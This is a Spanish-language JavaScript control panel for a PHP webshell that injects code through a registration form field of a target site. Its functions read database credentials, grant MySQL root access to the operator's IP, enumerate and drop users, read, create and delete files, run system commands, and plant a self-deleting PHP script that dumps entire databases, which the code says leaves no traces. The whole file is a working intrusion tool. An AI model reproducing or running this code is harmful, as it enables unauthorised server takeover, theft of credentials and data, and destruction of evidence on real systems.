const output = document.getElementById("output");
const commandInput = document.getElementById("command");
const submitButton = document.getElementById("submit");

async function makeRequest() {
    const url = document.getElementById("url").value;
    const command = commandInput.value;

    let headersList = {
        Accept: "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
        "Accept-Language": "es-ES,es;q=0.9",
        "Cache-Control": "no-cache",
        Connection: "keep-alive",
        "Content-Type": "application/x-www-form-urlencoded",
        Pragma: "no-cache",
        "Sec-Fetch-Dest": "document",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-Site": "same-origin",
        "Sec-Fetch-User": "?1",
        "Upgrade-Insecure-Requests": "1",
        "sec-ch-ua-mobile": "?1",
        "sec-ch-ua-platform": "Android",
    };

    let bodyContent = `formAccount=usuariosisi6&formPseudo=apodosisi6&formPassword=12345678aA&formPasswordConf=12345678aA&formEmail=tusmuertos7@gmail.com&formQuestion=si%3F&formReponse=no&register_validation=&formLastHardwareId2=error_reporting(0);@set_time_limit(0);echo"SOWS--";${command};echo"--EOWS";`;

    let response = await fetch(url, {
        method: "POST",
        body: bodyContent,
        headers: headersList,
    });

    let regex = /SOWS--([\s\S]*?)--EOWS/;

    let data = await response.text();
    let resultado = data.match(regex);

    if (!resultado) output.innerText = data;
    output.innerText = resultado[1].replace(/�/g, "-");
}

function getCredentials() {
    commandInput.value = "$db = [$db_host, $db_usuario, $db_password, $db_nombre]; print_r($db);";
    submitButton.click();
}

async function getPermissions() {
    let ip = window.prompt("Ingresa la IP con la que quieres obtener acceso", await getClientIp());
    if (!ip) return;
    commandInput.value = `$result = $conn->query("GRANT ALL PRIVILEGES ON *.* TO 'root'@'${ip}' WITH GRANT OPTION"); print_r($result);`;
    submitButton.click();
}

function getUsers() {
    commandInput.value = `if ($result = $conn->query("SELECT User, Host FROM mysql.user")) { while($row = $result->fetch_assoc()) { echo "Usuario: " . $row["User"]. ", Host: " . $row["Host"]. "\\n"; } } else { echo "0 resultados"; }`;
    submitButton.click();
}

function getDatabases() {
    commandInput.value = `$result = $conn->query("SHOW DATABASES");if ($result->num_rows > 0) { while($row = $result->fetch_assoc()) { echo $row["Database"] . "\\n"; } } else { echo "No hay bases de datos"; }`;
    submitButton.click();
}

function getTables() {
    let databaseName = window.prompt("Ingresa el nombre de la base de datos");
    if (!databaseName) return;
    commandInput.value = `$dbname = '${databaseName}'; if ($result = $conn->query("SHOW TABLES FROM $dbname")) { while($row = $result->fetch_array()) { echo $row[0] . "\\n"; } } else { echo "No hay tablas en la base de datos"; }`;
    submitButton.click();
}

async function deleteUser() {
    let user = window.prompt("Ingresa el usuario que quieres eliminar", "root");
    if (!user) return;
    let ip = window.prompt(`Ingresa el host asociado con el nombre del usuario ${user}`, await getClientIp());
    if (!ip) return;
    commandInput.value = `if ($conn->query("DROP USER '${user}'@'${ip}'")) { echo "Usuario eliminado con éxito"; } else { echo "Error al eliminar usuario: " . $conn->error; }`;
    submitButton.click();
}

function readFile() {
    let file = window.prompt("Ingresa la ruta del archivo a leer", "C:/xampp/htdocs/web/");
    if (!file) return;
    commandInput.value = `readFile("${file}");`;
    submitButton.click();
}

function getIpConfig() {
    commandInput.value = `system("ipconfig");`;
    submitButton.click();
}

function showDir() {
    let route = window.prompt("Ingresa la ruta de la carpeta a leer", "C:/xampp/htdocs/web");
    if (!route) return;
    commandInput.value = `system('tree /F ${route}');`;
    submitButton.click();
}

function createFile() {
    let route = window.prompt("Ingresa la ruta absoluta donde quieres crear el archivo junto con su nombre", "C:/xampp/htdocs/web/controllers/1.php");
    if (!route) return;
    let content = window.prompt("Ingresa el contenido del archivo");
    if (!content) return;

    // Escapamos las comillas simples y las barras invertidas
    content = encodeURIComponent(content.replace(/\\/g, "\\\\").replace(/'/g, "\\'"));

    commandInput.value = `$file = fopen($filename = '${route}', 'w'); fwrite($file, '${content}'); fclose($file); echo file_exists($filename) ? "El archivo se creó correctamente." : "Hubo un error al crear el archivo.";`;
    submitButton.click();
}

function deleteFile() {
    let route = window.prompt("Ingresa la ruta absoluta del archivo que quieres eliminar", "C:/xampp/htdocs/web/controllers");
    if (!route) return;
    let prohibitedRoutes = [
        "C:/xampp/htdocs",
        "C:/xampp/htdocs/",
        "C:/xampp/htdocs/web",
        "C:/xampp/htdocs/web/",
        "C:/xampp/htdocs/web/controllers",
        "C:/xampp/htdocs/web/controllers/",
        "C:/xampp/htdocs/web/controllers/register.php",
        "C:/xampp/htdocs/web/controllers/register.php/",
    ];
    if (prohibitedRoutes.includes(route)) return alert("No puedes eliminar ninguna carpeta/archivo que afecte a la webshell.");
    commandInput.value = `if (is_writable($filename = '${route}')) { echo unlink($filename) ? "El archivo ha sido eliminado." : "El archivo no se pudo eliminar."; } else { echo "El archivo no se puede eliminar."; }`;
    submitButton.click();
}

function downloadDatabase() {
    let database = window.prompt("Ingresa el nombre de la base de datos que quieres descargar");
    if (!database) return;
    const url = document.getElementById("url").value;
    output.innerText = `Volcando base de datos "${database}"... Este proceso podría tardar minutos.`;

    let xhr = new XMLHttpRequest();
    xhr.open("GET", `${url}/controllers/handler.php?dbname=${database}`, true);
    xhr.responseType = "blob";

    xhr.onprogress = (event) => {
        if (event.lengthComputable) {
            let percentComplete = Math.round((event.loaded / event.total) * 100);
            output.innerText = `Descarga ${percentComplete}% completada.`;
        }
    };

    xhr.onload = async () => {
        if (xhr.status == 200) {
            output.innerText = `Base de datos "${database}" lista para su descarga.`;
            let blob = new Blob([xhr.response], { type: "application/octet-stream" });
            let urlBlob = window.URL.createObjectURL(blob);
            let link = document.createElement("a");
            link.href = urlBlob;
            link.download = `${database}.sql`;
            document.body.appendChild(link);
            link.click();
            document.body.removeChild(link);
            let response = await fetch(`${url}/controllers/handler.php?action=delete`);
            let data = await response.json();
            if (!data.success) {
                output.innerText = `El archivo no se pudo autodestruir.`;
                return;
            }
            output.innerText += `\nArchivo de dumpeo eliminado correctamente. No se dejaron rastros.`;
        } else {
            output.innerText = `Error al descargar la base de datos: ${xhr.statusText}`;
        }
    };

    xhr.onerror = () => {
        alert("Error al descargar el archivo.");
    };

    xhr.send();
}

function createDumperFile() {
    let content = encodeURIComponent(
        `<?php require_once "../config.php"; set_time_limit(0); if (isset($_GET["action"])) { $response = []; if ($_GET["action"] === "delete") { if (!is_writable(__FILE__)) { $response["success"] = false; $response["message"] = "El archivo no se pudo autodestruir."; echo json_encode($response); exit; } unlink(__FILE__); $response["success"] = true; $response["message"] = "El archivo ha sido autodestruido."; echo json_encode($response); exit; } } try { if (!isset($_GET["dbname"])) { throw new Exception("No se proporcionó el parámetro 'dbname'."); } $db_name = $_GET["dbname"]; $mysqli = new mysqli($db_host, $db_usuario, $db_password); if ($mysqli->connect_error) { throw new Exception("Error de conexión: " . $mysqli->connect_error); } if (!$mysqli->select_db($db_name)) { throw new Exception("Error: La base de datos '$db_name' no existe."); } $result = $mysqli->query('SHOW TABLES'); if (!$result) { throw new Exception("Error: No se pudo obtener la lista de tablas."); } $tables = $result->fetch_all(MYSQLI_NUM); if (empty($tables)) { throw new Exception("Error: No existen tablas en la base de datos."); } $dump = ''; foreach ($tables as $table) { $table = $table[0]; $result = $mysqli->query("SHOW CREATE TABLE \`$table\`"); $row = $result->fetch_assoc(); $dump .= $row['Create Table'] . ";\n\n"; $result = $mysqli->query("SELECT * FROM \`$table\`"); $num_fields = $result->field_count; while ($row = $result->fetch_row()) { $dump .= "INSERT INTO \`$table\` VALUES("; $fields = array(); for ($j = 0; $j < $num_fields; $j++) { $fields[] = "'" . $mysqli->real_escape_string($row[$j]) . "'"; } $dump .= implode(',', $fields); $dump .= ");\n"; } $dump .= "\n\n"; } header('Content-Description: File Transfer'); header('Content-Type: application/octet-stream'); header('Content-Disposition: attachment; filename=database.sql'); header('Expires: 0'); header('Cache-Control: must-revalidate'); header('Pragma: public'); header('Content-Length: ' . strlen($dump)); echo $dump; exit; } catch (Exception $e) { http_response_code(500); $response["message"] = $e->getMessage(); echo json_encode($response); exit; }`
            .replace(/\\/g, "\\\\")
            .replace(/'/g, "\\'")
    );
    commandInput.value = `$file = fopen($filename = 'C:/xampp/htdocs/web/controllers/handler.php', 'w'); fwrite($file, '${content}'); fclose($file); echo file_exists($filename) ? "El archivo de dump se creó correctamente." : "Hubo un error al crear el archivo de dump.";`;
    submitButton.click();
}

async function getClientIp() {
    try {
        let response = await fetch("https://api.ipify.org?format=json");
        let data = await response.json();
        return data.ip;
    } catch (error) {
        console.error("Hubo un error al obtener la IP del cliente: ", error);
    }
}
